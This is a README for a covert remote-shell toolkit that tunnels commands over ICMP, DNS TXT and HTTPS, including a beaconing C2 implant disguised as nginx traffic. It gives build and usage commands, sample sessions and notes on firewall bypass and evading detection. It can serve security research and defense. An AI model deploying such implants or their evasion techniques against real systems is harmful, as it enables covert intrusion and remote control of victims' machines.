# Covert Shell — ICMP, DNS & HTTPS

Remote shell implementations that tunnel commands over ICMP echo packets,
DNS TXT records, and HTTPS.  Each protocol has a Python version and a C version.

> **For authorized security research and CTF use only.**
> Do not use against systems you don't own or have written permission to test.

---

## Files

| File | Language | Protocol |
|------|----------|----------|
| `icmp_shell.py`  | Python 3 | ICMP echo request/reply |
| `icmp_shell.c`   | C (C17)  | ICMP echo request/reply |
| `dns_shell.py`   | Python 3 | DNS TXT over UDP |
| `dns_shell.c`    | C (C17)  | DNS TXT over UDP |
| `https_shell.py` | Python 3 | HTTPS (TLS, beaconing C2) |
| `https_shell.c`  | C (C17)  | HTTPS (TLS, beaconing C2) |
| `Makefile`       | Make     | Builds all C targets |
| `test_https.sh`  | Bash     | Smoke test for https_shell.py |

---

## How it works

### ICMP

Commands are embedded in ICMP echo-request payloads (type 8) behind a
4-byte magic tag (`0xDEADBEEF`) and an identifier (`0x4943`).  The server
runs a command via `/bin/sh` and sends the output back in ICMP echo-reply
payloads (type 0), split into 1200-byte numbered chunks so the client can
reassemble them.  Regular pings are filtered out by the magic tag.

```
client                        server
  |-- ICMP echo-req ------------>|   [MAGIC | CMD | seq | "ls -la"]
  |<-- ICMP echo-rep (chunk 0) --|   [MAGIC | RESP | seq | 0 | 2 | data...]
  |<-- ICMP echo-rep (chunk 1) --|   [MAGIC | RESP | seq | 1 | 2 | data...]
```

### DNS

Commands are base32-encoded and packed into DNS subdomain labels:


```
<b32cmd>.<txid_hex>.cmd.shell.tunnel
```

The server decodes the subdomain, executes the command, and returns
the base64-encoded output in a DNS TXT record response.  No real DNS
infrastructure is required — the client sends packets directly to the
server IP on the chosen UDP port.

```
client                                 server
  |--(DNS query: "b32cmd.0001.cmd.shell.tunnel") -->|
  |<-- (DNS TXT response: base64(output)) ----------|
```

### HTTPS

The server is the operator console; the client (implant) runs on the target.
The implant polls `GET /b` on a configurable interval, picks up a queued
command, executes it, and POSTs base64-encoded output to `POST /r`.
All traffic is TLS-encrypted.  The server masquerades as nginx and the
endpoints look like ordinary JSON API calls.

```
implant                          operator (server)
  |-- GET /b (beacon) ------------>|  {"id":0,"cmd":""}   ← nothing yet
  |-- GET /b (beacon) ------------>|  {"id":1,"cmd":"bHMgLWxh"}
  |   execute: ls -la              |
  |-- POST /r {"id":1,"out":"..."} |  result printed to console
```

A self-signed TLS cert is auto-generated on first run (Python version).
The C version requires a pre-generated cert (one openssl command).

---

## Build (C versions)

All C code targets **C17** (`-std=c17`) and uses `_Static_assert` to catch
bad buffer assumptions at compile time.  The HTTPS shell additionally uses
`_Noreturn` on its `usage()` function.

**Build all with make (recommended):**
```bash
make          # builds icmp_shell, dns_shell, https_shell
make clean    # remove binaries
```

**Or build individually:**
```bash
gcc -O2 -Wall -Wextra -std=c17 -o icmp_shell  icmp_shell.c
gcc -O2 -Wall -Wextra -std=c17 -o dns_shell   dns_shell.c
gcc -O2 -Wall -Wextra -std=c17 -o https_shell https_shell.c \
    $(pkg-config --cflags --libs openssl) -lpthread
```

The HTTPS shell requires OpenSSL headers and libraries:
- **macOS (Homebrew):** `brew install openssl`
- **Debian/Ubuntu:** `apt install libssl-dev`

---

## Usage

### ICMP shell

Raw sockets require root (or `CAP_NET_RAW` on Linux).

**Server** (on the target / pivot host):
```bash
sudo python3 icmp_shell.py server
# or
sudo ./icmp_shell server
```

Output:
```
[*] Server IP: 192.168.1.50
[*] ICMP shell server — listening for echo requests (Ctrl-C to stop)
```

**Client** (on the attacker / operator machine):
```bash
sudo python3 icmp_shell.py client 192.168.1.50
# or
sudo ./icmp_shell client 192.168.1.50
```

```
[*] ICMP shell → 192.168.1.50  (type 'exit' to quit)
icmp> whoami
root
icmp> uname -a
Linux target 5.15.0 ...
icmp> exit
```

---

### DNS shell

Port 5353 works without root.  Use port 53 for stealth (requires root on server).

**Server:**
```bash
python3 dns_shell.py server --port 5353
# or
./dns_shell server 5353
```

Output:
```
[*] Server IP: 192.168.1.50
[*] DNS server — UDP :5353  (Ctrl-C to stop)
```

**Client:**
```bash
python3 dns_shell.py client 192.168.1.50 --port 5353
# or
./dns_shell client 192.168.1.50 5353
```

```
[*] DNS shell → 192.168.1.50:5353  (type 'exit' to quit)
dns> id
uid=0(root) gid=0(root)
dns> ls /
bin  boot  dev  etc  home ...
dns> exit
```

---

### HTTPS shell

The most firewall-friendly option.  Port 443 requires root on the server;
use `--port 8443` for unprivileged testing.

**Generate a cert (C version or bring-your-own):**
```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
        -days 365 -nodes -subj '/CN=cdn.example.com'
```
The Python version auto-generates a cert if `--cert` / `--key` are omitted.

**Server** (operator console):
```bash
sudo python3 https_shell.py server --port 443
# or (C — cert required)
sudo ./https_shell server --port 443 --cert cert.pem --key key.pem
```

Output:
```
[*] Generating self-signed cert…
[*] Server IP  : 192.168.1.50
[*] HTTPS C2   : https://192.168.1.50:443
[*] Cert       : /tmp/https_shell_xyz/cert.pem
[*] Beacon path: GET /b  POST /r
[*] Waiting for implant…

https>
```

**Client** (implant — no root needed):
```bash
python3 https_shell.py client 192.168.1.50
# or
./https_shell client 192.168.1.50
```

```
[*] Implant beaconing → https://192.168.1.50:443  (every 3s)
```

Once the implant is beaconing, type commands in the operator console:
```
https> whoami
root
https> uname -a
Linux target 5.15.0-91-generic ...
https> exit
```

**Smoke test (Python server only):**
```bash
bash test_https.sh
```

---

## Docker (DNS shell server)

Run the DNS server in a container and connect to it from a local terminal.
Port 5353 is reserved for mDNS on most systems, so map to 5454.

**Build and start:**
```bash
docker build -t dns-shell .
docker run -d --name dns-shell-server -p 5454:5353/udp dns-shell
```

**Check it started:**
```bash
docker logs dns-shell-server
```
```
[*] Server IP: 172.17.0.2
[*] DNS shell server — UDP :5353  (Ctrl-C to stop)
```

**Connect from a local terminal:**
```bash
python3 dns_shell.py client 127.0.0.1 --port 5454
```
```
[*] DNS shell client → 127.0.0.1:5454  (Ctrl-C / 'exit' to quit)
dns> whoami
root
dns> ls /
app  bin  boot  dev  etc  home ...
dns> exit
```

**Watch server logs live** (second terminal):
```bash
docker logs -f dns-shell-server
```
```
[+] 192.168.65.1  txid=0x0001  cmd='whoami'
[+] 192.168.65.1  txid=0x0002  cmd='ls /'
```

**Stop / restart:**
```bash
docker stop dns-shell-server
docker start dns-shell-server
```

---

## Limitations

| | ICMP | DNS | HTTPS |
|-|------|-----|-------|
| Privileges | Root on **both** sides | Root for port 53; client unprivileged | Root for port 443; client unprivileged |
| Max output per round-trip | ~76 KB (64 × 1200 B chunks) | ~2800 B raw | ~64 KB |
| Max command length | ~3800 B | ~118 B (DNS label limits) | ~4 KB |
| Firewall bypass | ICMP allowed on most LANs; blocked at most perimeters | UDP 53/5353 outbound | TCP 443 — nearly universal |
| Detection risk | Large ICMP payloads flagged by IDS | High-entropy subdomains; abnormal query rate | Low — looks like normal HTTPS JSON API traffic |
| Latency | Per-command (synchronous) | Per-command (synchronous) | Beacon interval (default 3 s) |

---

## Protocol detail

### ICMP payload layout

```
Offset  Size  Field
0       4     Magic: 0xDE 0xAD 0xBE 0xEF
4       1     Type: 0x01=CMD  0x02=RESP
5       2     Sequence number (big-endian)
-- RESP only --
7       2     Chunk index (big-endian)
9       2     Chunk total (big-endian)
11      N     Data
-- CMD only --
7       N     Command bytes (UTF-8)
```

### DNS query name format

```
<b32_data_label0>.<b32_data_label1>...<txid_4hex>.cmd.shell.tunnel
```

- Data labels are lowercase base32, each at most 63 characters.
- Response: a single DNS TXT RR containing base64(output), split into
  255-byte strings in the RDATA.

### HTTPS protocol

```
GET /b  →  {"id": <int>, "cmd": "<base64 command>"}
           {"id": 0,     "cmd": ""}              ← nothing pending

POST /r ←  {"id": <int>, "out": "<base64 output>"}
        →  {"ok": true}
```

- All other paths return a fake `404 Not Found` (nginx-style headers).
- `id` is a monotonically increasing integer; the implant ignores
  responses with an id it has already processed, making duplicate
  delivery safe.
- Output is capped at 64 KB per command.
